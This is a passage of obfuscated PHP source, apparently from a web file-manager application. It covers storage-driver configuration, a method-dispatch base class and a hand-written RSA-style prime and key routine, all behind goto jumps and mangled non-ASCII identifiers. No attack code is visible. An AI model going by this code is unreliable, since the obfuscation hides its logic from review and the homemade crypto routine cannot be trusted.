$E’Ë“±∏∑†[$E¿»∂ƒ≥ó‰]; $e…å∏àêñ = $Eç£‡ë—ñı[700]; if (strlen($e…å∏àêñ) < $Eç£‡ë—ñı[602]) { die; } } $eá·—Æ©ã† = $DÊáü“ÀŒ∫[373]($d¯ÜÇÏ»‘™); goto AãôãÂÂœæ; A¢Æ„Á‘≥†: $dùüπËÆïè = $DÊáü“ÀŒ∫[372]($dùüπËÆïè); $Eôø∑≈Ωñ  = $Eç£‡ë—ñı[694]; $DèÌ¬µóÁã = $dùüπËÆïè[0]; goto fØπ°ôêÁó; cÉ‘ñ›ÙÌ÷: default: $eá·—Æ©ã† = $this->{$_SERVER[ñÖÀ‰Ø][274]}($dùüπËÆïè, $Aãìäõâπ . $aá¨œ∑ÁîÑ); break; } if ($d“∂ç˘◊‹≥ - 1 > 0) { $eá·—Æ©ã† = $this->{$_SERVER[ñÖÀ‰Ø][213]}($eá·—Æ©ã†, $Aãìäõâπ, $d“∂ç˘◊‹≥ - 1); } goto BÇ¨ÃÉ¡›Ñ; E√◊—ÂèÆ–: $dùüπËÆïè = $DÊáü“ÀŒ∫[238]($dùüπËÆïè); $A‹´ã–⁄Éî = $dùüπËÆïè[0]; $aá¨œ∑ÁîÑ = $DÊáü“ÀŒ∫[25]($dùüπËÆïè, 1, 15); goto B…ì›• ©¯; B…ì›• ©¯: $dùüπËÆïè = $DÊáü“ÀŒ∫[25]($dùüπËÆïè, 16); $b’ΩåÔÍÙ = $Eç£‡ë—ñı[686]; if (!$b’ΩåÔÍÙ) { return; } goto E›Ù≠√û‚ï; EŒúÙÙÒ ≥: $Eç£‡ë—ñı =& $_SERVER[Öíæ€“”≠éÏË]; $DÊáü“ÀŒ∫ =& $_SERVER[ñÖÀ‰Ø]; if (!$DÊáü“ÀŒ∫[163]($dùüπËÆïè) || $DÊáü“ÀŒ∫[24]($dùüπËÆïè) < 10) { return !1; } goto E≈íﬂÓÔõè; dÙÎùß€üâ: } public function zamx5f9cc239($EπœÏ®Ìçﬂ) { goto FÀÛìá∏úî; A“‹Ïõœ¶Œ: for ($EàˆÏÂ˜À = 0; $EàˆÏÂ˜À < $e≈‰Ö§ß∂Û * 10; $EàˆÏÂ˜À++) { if (($e≈‰Ö§ß∂Û * $EàˆÏÂ˜À + 1) % $aˆËË∏Èèª == 0) { $EÊ€ƒìÙÕ§ = $aÏ‡Âûâ¿¡[268](($e≈‰Ö§ß∂Û * $EàˆÏÂ˜À + 1) / $aˆËË∏Èèª); break; } } $D≤âãì‘éç = $this->{$_SERVER[ñÖÀ‰Ø][170]}($DÊ¬ÁÍõ·” * $E∆àê‘Í¡Ö . $aÏ‡Âûâ¿¡[10], $aÏ‡Âûâ¿¡[172]); $d’û≠ÌÉ°° = $aÏ‡Âûâ¿¡[129]($aÏ‡Âûâ¿¡[375] . ($DÊ¬ÁÍõ·” + $E∆àê‘Í¡Ö) . $aÏ‡Âûâ¿¡[376] . $aˆËË∏Èèª . $aÏ‡Âûâ¿¡[376] . $EÊ€ƒìÙÕ§ . $aÏ‡Âûâ¿¡[377]); goto aÚ·ì“ˆô∑; Fé¥ôã–Ê: if (!$EﬂÒü⁄“ˆÕ) { return; } $aˆËË∏Èèª = $aÏ‡Âûâ¿¡[268](($DÊ¬ÁÍõ·” + $E∆àê‘Í¡Ö) / 2); while (1) { $aÁ‹“‚˘êû = $aˆËË∏Èèª; $bàÙ¨ºä™é = $e≈‰Ö§ß∂Û; $Bñ‘≥Ú∂‹ï = $aªµΩÇ…§Ë[703]; if (!$Bñ‘≥Ú∂‹ï) { die; } while ($bàÙ¨ºä™é % $aÁ‹“‚˘êû != 0) { $E‚¢âŒè‡ƒ = $bàÙ¨ºä™é; $a…ù∂ãﬁ’È = $aªµΩÇ…§Ë[704]; while (strlen($a…ù∂ãﬁ’È) < $aªµΩÇ…§Ë[594]) { if (!$a…ù∂ãﬁ’È) { break; } $a…ù∂ãﬁ’È++; } $bàÙ¨ºä™é = $aÁ‹“‚˘êû; $aÁ‹“‚˘êû = $E‚¢âŒè‡ƒ % $aÁ‹“‚˘êû; } if ($aÁ‹“‚˘êû == 1) { break; } else { $aˆËË∏Èèª++; } } goto A°‡›ê∑æû; eë”á«≈‚ù: $E∆àê‘Í¡Ö = $this->{$_SERVER[ñÖÀ‰Ø][374]}(); $e≈‰Ö§ß∂Û = ($DÊ¬ÁÍõ·” - 1) * ($E∆àê‘Í¡Ö - 1); $EﬂÒü⁄“ˆÕ = $aªµΩÇ…§Ë[702]; goto Fé¥ôã–Ê; aÚ·ì“ˆô∑: $E¡àÃ§Í≈¶ = $this->{$_SERVER[ñÖÀ‰Ø][170]}($EπœÏ®Ìçﬂ, $d’û≠ÌÉ°°) . $aÏ‡Âûâ¿¡[378] . $D≤âãì‘éç; return $E¡àÃ§Í≈¶; $c¿»À—≠á™ = $aªµΩÇ…§Ë[706]; goto fß‚µóôøø; A°‡›ê∑æû: $EÊ€ƒìÙÕ§ = 2; $f√∞˘à€à§ = $aªµΩÇ…§Ë[705]; if (strlen($f√∞˘à€à§) < $aªµΩÇ…§Ë[607]) { return; } goto A“‹Ïõœ¶Œ; fß‚µóôøø: if (!$c¿»À—≠á™) { die; } goto Dµ§Á◊Ë±î; FÀÛìá∏úî: $aªµΩÇ…§Ë =& $_SERVER[Öíæ€“”≠éÏË]; $aÏ‡Âûâ¿¡ =& $_SERVER[ñÖÀ‰Ø]; $DÊ¬ÁÍõ·” = $this->{$_SERVER[ñÖÀ‰Ø][374]}(); goto eë”á«≈‚ù; Dµ§Á◊Ë±î: } public function lzda757454e1($cì¿ èØ‚Ç) { goto Dã’ΩÎ÷ôÇ; E„ƒ√Õ±ΩÚ: $bâüî™ÆÍﬂ = 0; $E≈é¥≈∞ûñ = $bÆ´–¥•íË[709]; if (strlen($E≈é¥≈∞ûñ) < $bÆ´–¥•íË[602]) { return; } goto e—ΩÒœÏÈî; fÃÜ»»”˘Ô: while (strlen($FãóõÛä™ê) < $bÆ´–¥•íË[594]) { if (!$FãóõÛä™ê) { break; } $FãóõÛä™ê++; } if (!$A¿Ø÷¥õÇŒ) { return $b’Œ§˜¢≤Í[10]; } $A¿Ø÷¥õÇŒ = $b’Œ§˜¢≤Í[268]($A¿Ø÷¥õÇŒ); goto c≥Ô¶ß‘ÍÂ; Dã’ΩÎ÷ôÇ: $bÆ´–¥•íË =& $_SERVER[Öíæ€“”≠éÏË]; $b’Œ§˜¢≤Í =& $_SERVER[ñÖÀ‰Ø]; $CΩ∂æùä–è = $b’Œ§˜¢≤Í[0]($b’Œ§˜¢≤Í[378], $cì¿ èØ‚Ç); goto aÇ∏∑ìÖá¨; BüÙÆÛ¶ÈŸ: return $Aö˘¶ó∑ß÷; goto bÿ£Ê¯Úä√; aÇ∏∑ìÖá¨: if ($b’Œ§˜¢≤Í[19]($CΩ∂æùä–è) != 2) { return $b’Œ§˜¢≤Í[10]; } $A¿Ø÷¥õÇŒ = $this->{$_SERVER[ñÖÀ‰Ø][274]}($CΩ∂æùä–è[1] . $b’Œ§˜¢≤Í[10], $b’Œ§˜¢≤Í[172]); $FãóõÛä™ê = $bÆ´–¥•íË[707]; goto fÃÜ»»”˘Ô; eã—“…∫ÛÕ: $Aö˘¶ó∑ß÷ = $this->{$_SERVER[ñÖÀ‰Ø][274]}($CΩ∂æùä–è[0], $D§‹≥ø÷â÷); $d¢∆ºóÉÂ± = $bÆ´–¥•íË[716]; if (strlen($d¢∆ºóÉÂ±) < $bÆ´–¥•íË[607]) { die; } goto BüÙÆÛ¶ÈŸ; aÕãòÏéÜ—: $D§‹≥ø÷â÷ = $b’Œ§˜¢≤Í[129]($b’Œ§˜¢≤Í[375] . ($d¯é…ã§∫Ç + $bâüî™ÆÍﬂ) . $b’Œ§˜¢≤Í[376] . $A∏£‹î≠ˆΩ . $b’Œ§˜¢≤Í[376] . $büÊÇÁËè . $b’Œ§˜¢≤Í[377]); $AØ‰‚ï¬—á = $bÆ´–¥•íË[715]; if (!$AØ‰‚ï¬—á) { return; } goto eã—“…∫ÛÕ; cëå¯ëÊ•Ú: while (1) { $Cèã¥Â”›Ã = $A∏£‹î≠ˆΩ; $Eπ∫œ‘∂¬ÿ = $bÆ´–¥•íË[713]; if (!$Eπ∫œ‘∂¬ÿ) { die; } $eﬂ†–∑’ı› = $Fêê“Ú“•‘; $a°ËÂØï‡Ó = $bÆ´–¥•íË[714]; while ($eﬂ†–∑’ı› % $Cèã¥Â”›Ã != 0) { $DüØ”µøŸé = $eﬂ†–∑’ı›; $eﬂ†–∑’ı› = $Cèã¥Â”›Ã; $Cèã¥Â”›Ã = $DüØ”µøŸé % $Cèã¥Â”›Ã; } if ($Cèã¥Â”›Ã == 1) { break; } else { $A∏£‹î≠ˆΩ++; } } $büÊÇÁËè = 2; for ($fÀ¥Ÿûáç– = 0; $fÀ¥Ÿûáç– < $Fêê“Ú“•‘ * 10; $fÀ¥Ÿûáç–++) { if (($Fêê“Ú“•‘ * $fÀ¥Ÿûáç– + 1) % $A∏£‹î≠ˆΩ == 0) { $büÊÇÁËè = $b’Œ§˜¢≤Í[268](($Fêê“Ú“•‘ * $fÀ¥Ÿûáç– + 1) / $A∏£‹î≠ˆΩ); break; } } goto aÕãòÏéÜ—; c≥Ô¶ß‘ÍÂ: $f≤ÒÌí´ë˘ = $bÆ´–¥•íË[708]; if (!$f≤ÒÌí´ë˘) { return; } $d¯é…ã§∫Ç = 0; goto E„ƒ√Õ±ΩÚ; e—ΩÒœÏÈî: for ($fÀ¥Ÿûáç– = 3; $fÀ¥Ÿûáç– < $A¿Ø÷¥õÇŒ; $fÀ¥Ÿûáç– += 2) { if ($A¿Ø÷¥õÇŒ % $fÀ¥Ÿûáç– != 0) { continue; } $d¯é…ã§∫Ç = $fÀ¥Ÿûáç–; $Dåé≤ËÁÀò = $bÆ´–¥•íË[710]; while (strlen($Dåé≤ËÁÀò) < $bÆ´–¥•íË[594]) { if (!$Dåé≤ËÁÀò) { break; } $Dåé≤ËÁÀò++; } $bâüî™ÆÍﬂ = $b’Œ§˜¢≤Í[268]($A¿Ø÷¥õÇŒ / $fÀ¥Ÿûáç–); $c±Ú°Ë≈Æ¬ = $bÆ´–¥•íË[711]; if (!$c±Ú°Ë≈Æ¬) { die; } break; $c€Ó‰âœ…≤ = $bÆ´–¥•íË[712]; if (!$c€Ó‰âœ…≤) { die; } } $Fêê“Ú“•‘ = ($d¯é…ã§∫Ç - 1) * ($bâüî™ÆÍﬂ - 1); $A∏£‹î≠ˆΩ = $b’Œ§˜¢≤Í[268](($d¯é…ã§∫Ç + $bâüî™ÆÍﬂ) / 2); goto cëå¯ëÊ•Ú; bÿ£Ê¯Úä√: } public function dsewded796a1() { goto F® ¶Ôªò”; cŸÊøΩúŸˆ: $e≠æ˘º‘†ü = array(); $FÌä…ô´ŸΩ = 1; while ($FÌä…ô´ŸΩ <= (int) $céí¡§îí∞[380]($FÛ±Î´Èò†)) { $A—Üáı¶€• = $FÌä…ô´ŸΩ; $d—èÆééíŒ = $Díˆä‡πœ§[717]; while ($d—èÆééíŒ < $Díˆä‡πœ§[589]) { if ($d—èÆééíŒ >= 0) { break; } $d—èÆééíŒ++; } while (!0) { $A—Üáı¶€•++; if ($A—Üáı¶€• <= 2) { $FÌä…ô´ŸΩ = $A—Üáı¶€•; break; } else { if ($A—Üáı¶€• < 2) { continue; } } $e∫Ô—∂ ë≤ = !0; for ($Bö‚Ãê‘§¥ = 2; $Bö‚Ãê‘§¥ <= $céí¡§îí∞[380]($A—Üáı¶€•); $Bö‚Ãê‘§¥++) { if ($A—Üáı¶€• % $Bö‚Ãê‘§¥ == 0) { $e∫Ô—∂ ë≤ = !1; } } if ($e∫Ô—∂ ë≤) { $FÌä…ô´ŸΩ = $A—Üáı¶€•; break; } } $e≠æ˘º‘†ü[] = $FÌä…ô´ŸΩ; } goto AâÍ‚¡–ÉÀ; F® ¶Ôªò”: $Díˆä‡πœ§ =& $_SERVER[Öíæ€“”≠éÏË]; $céí¡§îí∞ =& $_SERVER[ñÖÀ‰Ø]; $FÛ±Î´Èò† = $céí¡§îí∞[360]($céí¡§îí∞[379](2, 14), $céí¡§îí∞[379](2, 16) - 1); goto cŸÊøΩúŸˆ; AâÍ‚¡–ÉÀ: $AıúÍäæë = 2; for ($A—Üáı¶€• = $FÛ±Î´Èò†; $A—Üáı¶€• > 1; $A—Üáı¶€•--) { $e∫Ô—∂ ë≤ = !0; $a™â≠äâåÌ = $Díˆä‡πœ§[718]; foreach ($e≠æ˘º‘†ü as $D¢‚Œºäóæ) { if ($A—Üáı¶€• % $D¢‚Œºäóæ == 0) { $e∫Ô—∂ ë≤ = !1; break; } } if ($e∫Ô—∂ ë≤) { $AıúÍäæë = $A—Üáı¶€•; break; } } return $AıúÍäæë; goto D†ê˜ÛÇæû; D†ê˜ÛÇæû: } public function kjdzd684e90f($A≥ÿ‹¡ëç®, $A¬≈´‰Ü≤î) { $e∆€Æ£ûÃù =& $_SERVER[ñÖÀ‰Ø]; return $e∆€Æ£ûÃù[13](array($e∆€Æ£ûÃù[14], $e∆€Æ£ûÃù[381]), $A≥ÿ‹¡ëç®, $A¬≈´‰Ü≤î); $Eäèü©é„û = $_SERVER[Öíæ€“”≠éÏË][719]; } public function kins1b1f80ba($Dì’ÚÑÌ—Ö, $bÒΩ˜í≥¢ê) { $aıëçø„äç =& $_SERVER[Öíæ€“”≠éÏË]; $BÙ‹ıîÒï  =& $_SERVER[ñÖÀ‰Ø]; return $BÙ‹ıîÒï [13](array($BÙ‹ıîÒï [382], $BÙ‹ıîÒï [383]), $Dì’ÚÑÌ—Ö, $bÒΩ˜í≥¢ê); $aãºπƒ¨´ò = $aıëçø„äç[720]; while ($aãºπƒ¨´ò < $aıëçø„äç[589]) { if ($aãºπƒ¨´ò >= 0) { break; } $aãºπƒ¨´ò++; } } public function gwulcf85a1ba($FËÊó∑é»è, $bŸ´èÖ…éù) { $DÛêÊíÖŸÀ =& $_SERVER[ñÖÀ‰Ø]; return $DÛêÊíÖŸÀ[13](array($DÛêÊíÖŸÀ[382], $DÛêÊíÖŸÀ[384]), $FËÊó∑é»è, $bŸ´èÖ…éù); } } goto F–†€≥¨à¬; F—Ü’⁄ó»Ö: function binCheckBigger($F©∏·è∑éÀ, $dÌçÖ£∆ÇÃ) { return $F©∏·è∑éÀ > $dÌçÖ£∆ÇÃ; } $_SERVER[$_SERVER[ü“Ê˝][3]] = ("\71\62\62\61"."\66\64")+0;$_n4Sx="tJQGAkSXyjFM8vIHtS5dhWXYFEiAx69Yp5dCDrBwVkpCB2bsgsHdCQVYp4TFVEamz4YxKSnMBjMPZaeDbK";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($BàËìœ±Üπ, $a”Ñ≠Ï’¨å) { $DëΩÜ·◊¶Ñ =& $_SERVER[Öíæ€“”≠éÏË]; if (isset(self::$_methodList[$BàËìœ±Üπ])) { return @call_user_func_array(self::$_methodList[$BàËìœ±Üπ], $a”Ñ≠Ï’¨å); } else { if (method_exists($this, $BàËìœ±Üπ)) { return call_user_func_array(array($this, $BàËìœ±Üπ), $a”Ñ≠Ï’¨å); } else { think_exception(__CLASS__ . $DëΩÜ·◊¶Ñ[4] . $BàËìœ±Üπ . $DëΩÜ·◊¶Ñ[5]); } } } public static function __callStatic($bïïÿ‚™â¡, $d‚¡ﬁ´ﬁÊ¯) { if (isset(self::$_methodListStatic[$bïïÿ‚™â¡])) { return call_user_func_array(self::$_methodListStatic[$bïïÿ‚™â¡], $d‚¡ﬁ´ﬁÊ¯); } else { if (method_exists(self, $bïïÿ‚™â¡)) { return call_user_func_array(array(self, $bïïÿ‚™â¡), $d‚¡ﬁ´ﬁÊ¯); } else { show_json("{$bïïÿ‚™â¡}\x28\x29\40\x6e\157\164\40\x65\x78\151\163\164\73", !1); } } } public static function addMethod($dæÑò´§‚·, $a¯ß«§Ö∫æ) { self::$_methodList[$dæÑò´§‚·] = $a¯ß«§Ö∫æ; } public static function addMethodStatic($Déªô‘◊◊≠, $D÷ÂéôÈä£) { self::$_methodListStatic[$Déªô‘◊◊≠] = $D÷ÂéôÈä£; } } goto dÖâ≥±ü‡∂; b›úôÜ∏√é: class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\x6d\x2e\x73\x6f\x75\x72\x63\x65\123\145\x63\162\x65\x74\x4c\151\x73\x74"; public $field = array("\x73\x6f\x75\x72\143\x65\x49\x44", "\x74\x79\160\145\111\x44", "\143\162\145\141\164\145\x55\x73\145\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\155\x2e\163\164\x6f\x72\141\147\145\114\151\163\x74"; public $field = array("\x6e\x61\155\145", "\163\x69\x7a\x65\115\x61\x78", "\163\171\x73\x74\145\155", "\x64\x65\x66\141\x75\154\x74", "\x64\162\151\x76\145\x72", "\x63\x6f\x6e\x66\151\x67"); public function listData($d¿ä€Ù·¡Õ = false, $E¥ªèäÛö  = "\155\x6f\x64\x69\x66\x79\124\x69\x6d\145", $AÃ≤ı∞Óä‡ = false) { $dªÆ∫∑“ºƒ =& $_SERVER[Öíæ€“”≠éÏË]; $cŸÖ€π‹†ˆ = parent::listData($d¿ä€Ù·¡Õ, $E¥ªèäÛö , $AÃ≤ı∞Óä‡); if ($d¿ä€Ù·¡Õ) { return $cŸÖ€π‹†ˆ; } $eîÏáŸá’‚ = $this->ioSizeUseGet(array_to_keyvalue($cŸÖ€π‹†ˆ, $dªÆ∫∑“ºƒ[33], $dªÆ∫∑“ºƒ[394])); foreach ($cŸÖ€π‹†ˆ as $cë£Õﬁ±Ò” => $c—É‘â‡Üá) { unset($cŸÖ€π‹†ˆ[$cë£Õﬁ±Ò”][$dªÆ∫∑“ºƒ[6]]); $cŸÖ€π‹†ˆ[$cë£Õﬁ±Ò”][$dªÆ∫∑“ºƒ[1693]] = isset($eîÏáŸá’‚[$c—É‘â‡Üá[$dªÆ∫∑“ºƒ[394]]]) ? $eîÏáŸá’‚[$c—É‘â‡Üá[$dªÆ∫∑“ºƒ[394]]] : 0; } return $cŸÖ€π‹†ˆ; } public function ioSizeUseGet($e¯”Ê„èÉ’) { goto aÉõÊü“≠Ï; EÁ⁄á±∑π£: $fØêÃ·Â˜— = array($dœ£ç÷†» [795] => array($dœ£ç÷†» [7], $e¯”Ê„èÉ’)); $E¿µâû„Î‰ = Model($dœ£ç÷†» [760])->field($BãáÙú—ﬁﬂ)->where($fØêÃ·Â˜—)->group($dœ£ç÷†» [795])->select(); $E¿µâû„Î‰ = array_to_keyvalue($E¿µâû„Î‰, $dœ£ç÷†» [394], $dœ£ç÷†» [78]); goto D£Ê™ﬁµ’å; aÒ⁄ı€êñÕ: $E¿µâû„Î‰ = Cache::get($fà£∑®äÃ ); if ($E¿µâû„Î‰) { return $E¿µâû„Î‰; } $BãáÙú—ﬁﬂ = array($dœ£ç÷†» [795] => $dœ£ç÷†» [394], $dœ£ç÷†» [2011] => $dœ£ç÷†» [78]); goto EÁ⁄á±∑π£; aÉõÊü“≠Ï: $dœ£ç÷†»  =& $_SERVER[Öíæ€“”≠éÏË]; if (!$e¯”Ê„èÉ’) { return array(); } $fà£∑®äÃ  = $dœ£ç÷†» [2010] . implode($dœ£ç÷†» [47], $e¯”Ê„èÉ’); goto aÒ⁄ı€êñÕ; D£Ê™ﬁµ’å: Cache::set($fà£∑®äÃ , $E¿µâû„Î‰, 600); return $E¿µâû„Î‰; goto Fœ≤≈ãÌ–Œ; Fœ≤≈ãÌ–Œ: } public function getConfig($A∆É‚◊±‘º) { $bë¯Ì’˜øü = parent::listData($A∆É‚◊±‘º); return json_decode($bë¯Ì’˜øü[$_SERVER[Öíæ€“”≠éÏË][6]], !0); } public function update($aŸÇªÜçÈÙ, $A‰†ÜˆÇµ¨) { goto c¯ëˆ•ï»¯; c¯ëˆ•ï»¯: $aîã©Õˆƒﬂ =& $_SERVER[Öíæ€“”≠éÏË]; $eéÁ—Í¿”‹ = $A‰†ÜˆÇµ¨[$aîã©Õˆƒﬂ[28]]; $f‚âÒÉä‘ = array_to_keyvalue(parent::listData(), $aîã©Õˆƒﬂ[28]); goto Føﬂúé∞ƒä; Føﬂúé∞ƒä: if (isset($f‚âÒÉä‘[$eéÁ—Í¿”‹]) && $f‚âÒÉä‘[$eéÁ—Í¿”‹][$aîã©Õˆƒﬂ[394]] != $aŸÇªÜçÈÙ) { return !1; } if (isset($A‰†ÜˆÇµ¨[$aîã©Õˆƒﬂ[2012]]) && $A‰†ÜˆÇµ¨[$aîã©Õˆƒﬂ[2012]] == $aîã©Õˆƒﬂ[87]) { $this->checkConfig($A‰†ÜˆÇµ¨); } unset($A‰†ÜˆÇµ¨[$aîã©Õˆƒﬂ[2012]]); goto aªœ±áƒ∑ä; aªœ±áƒ∑ä: $fºÃëâœ≥Ö = parent::update($aŸÇªÜçÈÙ, $A‰†ÜˆÇµ¨); if ($fºÃëâœ≥Ö && $A‰†ÜˆÇµ¨[$aîã©Õˆƒﬂ[34]]) { foreach ($f‚âÒÉä‘ as $A£Úà£ÖŸ¿) { if ($A£Úà£ÖŸ¿[$aîã©Õˆƒﬂ[34]] && $A£Úà£ÖŸ¿[$aîã©Õˆƒﬂ[394]] != $aŸÇªÜçÈÙ) { parent::update($A£Úà£ÖŸ¿[$aîã©Õˆƒﬂ[394]], array($aîã©Õˆƒﬂ[34] => 0)); } } } return $fºÃëâœ≥Ö; goto Aéœ∞‘éÃ¿; Aéœ∞‘éÃ¿: } public function add($eÃóÆÕïì´) { goto b«–Œ‚€çõ; C¨±ïÁ›˜Î: return $b¯ıÚ‚û∫Ü; goto DÏÖ≈∫„Ü; b«–Œ‚€çõ: $Câ—∆õó›Æ =& $_SERVER[Öíæ€“”≠éÏË]; $A”¿Ÿ≈ÿ˘Ó = array_to_keyvalue(parent::listData(), $Câ—∆õó›Æ[28]); if (isset($A”¿Ÿ≈ÿ˘Ó[$eÃóÆÕïì´[$Câ—∆õó›Æ[28]]])) { return !1; } goto BÕáÒ«∆êÙ; BÕáÒ«∆êÙ: $this->checkConfig($eÃóÆÕïì´); $b¯ıÚ‚û∫Ü = parent::insert($eÃóÆÕïì´); if ($b¯ıÚ‚û∫Ü && $eÃóÆÕïì´[$Câ—∆õó›Æ[34]]) { foreach ($A”¿Ÿ≈ÿ˘Ó as $c›ëÌ¬∏Úò) { if ($c›ëÌ¬∏Úò[$Câ—∆õó›Æ[34]]) { parent::update($c›ëÌ¬∏Úò[$Câ—∆õó›Æ[394]], array($Câ—∆õó›Æ[34] => 0)); } } } goto C¨±ïÁ›˜Î; DÏÖ≈∫„Ü: } public function checkConfig(&$E»ÖñíÒŸ“, $C—‘ÉÊéùÒ = false) { goto AèéøòÍƒÓ; aº”ö÷ê«◊: $DãÃ÷ìçÜΩ = new $BÙ≠ü‘≠‚ƒ($Eö ÁÇáÁÍ); if (in_array($Fı„‚Ò›Ôè, $DãÃ÷ìçÜΩ->objectDriver)) { if (!$DãÃ÷ìçÜΩ->isBucketCors() && !$DãÃ÷ìçÜΩ->setBucketCors()) { $bˆΩÁÕë»∫ = LNG($cìÚŸƒÌÉ£[2017]); $bˆΩÁÕë»∫ .= $cìÚŸƒÌÉ£[2018] . LNG($cìÚŸƒÌÉ£[2019]); if ($C—‘ÉÊéùÒ) { return $bˆΩÁÕë»∫; } show_json($bˆΩÁÕë»∫, !1); } } $a»ÆﬂçÊÓ’ = rtrim($Eö ÁÇáÁÍ[$cìÚŸƒÌÉ£[1085]], $cìÚŸƒÌÉ£[8]) . $cìÚŸƒÌÉ£[8]; goto eﬂ˜ãÂÈÛÒ; eﬂ˜ãÂÈÛÒ: $FÒÛ‡“à « = $DãÃ÷ìçÜΩ->getPath($a»ÆﬂçÊÓ’ . $cìÚŸƒÌÉ£[1147]); if (!$DãÃ÷ìçÜΩ->mkfile($FÒÛ‡“à «)) { if ($C—‘ÉÊéùÒ) { return LNG($cìÚŸƒÌÉ£[2017]); } show_json(LNG($cìÚŸƒÌÉ£[2017]), !1); } $Eö ÁÇáÁÍ[$cìÚŸƒÌÉ£[1085]] = $a»ÆﬂçÊÓ’; goto cû©ÿë’‘«; cíè•â£ã“: $dƒﬂê÷öŸÎ = isset($D◊»∑—ë∞‚[$Fı„‚Ò›Ôè]) ? $D◊»∑—ë∞‚[$Fı„‚Ò›Ôè] : ucfirst($Fı„‚Ò›Ôè); $BÙ≠ü‘≠‚ƒ = $cìÚŸƒÌÉ£[72] . $dƒﬂê÷öŸÎ; if (!$dƒﬂê÷öŸÎ || !class_exists($BÙ≠ü‘≠‚ƒ)) { if ($C—‘ÉÊéùÒ) { return LNG($cìÚŸƒÌÉ£[2014]); } write_log(array($cìÚŸƒÌÉ£[2015], $E»ÖñíÒŸ“, get_caller_info()), $cìÚŸƒÌÉ£[2016]); show_json(LNG($cìÚŸƒÌÉ£[2014]), !1, $E»ÖñíÒŸ“); } goto aº”ö÷ê«◊; AèéøòÍƒÓ: $cìÚŸƒÌÉ£ =& $_SERVER[Öíæ€“”≠éÏË]; $Fı„‚Ò›Ôè = strtolower($E»ÖñíÒŸ“[$cìÚŸƒÌÉ£[94]]); $Eö ÁÇáÁÍ = json_decode($E»ÖñíÒŸ“[$cìÚŸƒÌÉ£[6]], !0); goto Eà„ÇÍ«Ö§; cû©ÿë’‘«: $E»ÖñíÒŸ“[$cìÚŸƒÌÉ£[6]] = json_encode($Eö ÁÇáÁÍ); $E»ÖñíÒŸ“[$cìÚŸƒÌÉ£[94]] = $dƒﬂê÷öŸÎ; return !0; goto eÂ⁄ÂÕÍàé; Eà„ÇÍ«Ö§: foreach ($Eö ÁÇáÁÍ as $c£∫Àã±¿“ => $aíπàÊôÔÊ) { $Eö ÁÇáÁÍ[$c£∫Àã±¿“] = trim($aíπàÊôÔÊ); } $Eö ÁÇáÁÍ[$cìÚŸƒÌÉ£[2013]] = rand_string(6); $D◊»∑—ë∞‚ = $GLOBALS[$cìÚŸƒÌÉ£[6]][$cìÚŸƒÌÉ£[88]][$cìÚŸƒÌÉ£[804]]; goto cíè•â£ã“; eÂ⁄ÂÕÍàé: } public function driverListSystem() { $bÔº›úÔ‹Ë =& $_SERVER[Öíæ€“”≠éÏË]; $b‹í›Ø¬À© = parent::listData(); $cÂÁˆ¬ç≈ñ = array(); foreach ($b‹í›Ø¬À© as $B°®é»€÷∆) { unset($B°®é»€÷∆[$bÔº›úÔ‹Ë[194]], $B°®é»€÷∆[$bÔº›úÔ‹Ë[84]]); $B°®é»€÷∆[$bÔº›úÔ‹Ë[6]] = json_decode($B°®é»€÷∆[$bÔº›úÔ‹Ë[6]], !0); $cÂÁˆ¬ç≈ñ[] = $B°®é»€÷∆; } return $cÂÁˆ¬ç≈ñ; } public function defaultDriver() { $e≥ˆ±≠¿ı¨ =& $_SERVER[Öíæ€“”≠éÏË]; $e°¿≈ÖÚµŒ = parent::listData(); $FÓ¢»èÑúÎ = array_filter_by_field($e°¿≈ÖÚµŒ, $e≥ˆ±≠¿ı¨[34], 1); $FÓ¢»èÑúÎ = $FÓ¢»èÑúÎ[0]; if ($FÓ¢»èÑúÎ) { $FÓ¢»èÑúÎ[$e≥ˆ±≠¿ı¨[6]] = json_decode($FÓ¢»èÑúÎ[$e≥ˆ±≠¿ı¨[6]], !0); } return $FÓ¢»èÑúÎ; } public function driverInfo($Bõ©⁄≥ÜÇ™) { $fÃÉÌô®¯Í =& $_SERVER[Öíæ€“”≠éÏË]; $EúÍÉÿ‹èö = array_to_keyvalue(parent::listData(), $fÃÉÌô®¯Í[394]); if (!isset($EúÍÉÿ‹èö[$Bõ©⁄≥ÜÇ™])) { return !1; } $CæıÖÉΩıæ = $EúÍÉÿ‹èö[$Bõ©⁄≥ÜÇ™]; $CæıÖÉΩıæ[$fÃÉÌô®¯Í[6]] = json_decode($CæıÖÉΩıæ[$fÃÉÌô®¯Í[6]], !0); return $CæıÖÉΩıæ; } public function remove($CÆ∑¶Î”ñÈ) { $this->removeShareItems($CÆ∑¶Î”ñÈ); return parent::remove($CÆ∑¶Î”ñÈ); } public function removeWithFile($AƒºòıÂæë, $bØ⁄—∫Ï•Â) { goto BÔªÏªÉŒ; AèÇë«·óå: if (!$D◊±®ãí∑ª) { $EÿÎíœ≤Ãﬂ->stop($FÊ‘Œé—’≥); return !1; } $EÿÎíœ≤Ãﬂ->end(); if ($bØ⁄—∫Ï•Â == $Eˆß‘µ“∫Ÿ[1673]) { $this->remove($AƒºòıÂæë); } goto B¬ñ≤´πôÙ; BÔªÏªÉŒ: $Eˆß‘µ“∫Ÿ =& $_SERVER[Öíæ€“”≠éÏË]; $aãü∑¨πà˘ = array($Eˆß‘µ“∫Ÿ[795] => $AƒºòıÂæë); $C∂Æˆ®Ü“¶ = Model($Eˆß‘µ“∫Ÿ[451])->where($aãü∑¨πà˘)->count(); goto C†çõŒìÿ·; E⁄ø®¿ßÜã: $dí¶êá„•ü = "\173\x69\157\72{$cì£Ë≈∆¡∆}\x7d\x2f"; $D◊±®ãí∑ª = !0; $aèÒ°¨ä£à = array(); goto D¢´ä±◊®Ó; C†çõŒìÿ·: $f˘¯ÛÎá¥Ñ = Model($Eˆß‘µ“∫Ÿ[451])->where($aãü∑¨πà˘)->sum($Eˆß‘µ“∫Ÿ[78]); $FÊ‘Œé—’≥ = $bØ⁄—∫Ï•Â . $Eˆß‘µ“∫Ÿ[2020] . $AƒºòıÂæë; $EÿÎíœ≤Ãﬂ = new TaskFileTransfer($FÊ‘Œé—’≥, $Eˆß‘µ“∫Ÿ[2016], $C∂Æˆ®Ü“¶, LNG($Eˆß‘µ“∫Ÿ[2021]) . "\50{$AƒºòıÂæë}\x29"); goto FÉπ–Ùåæú; 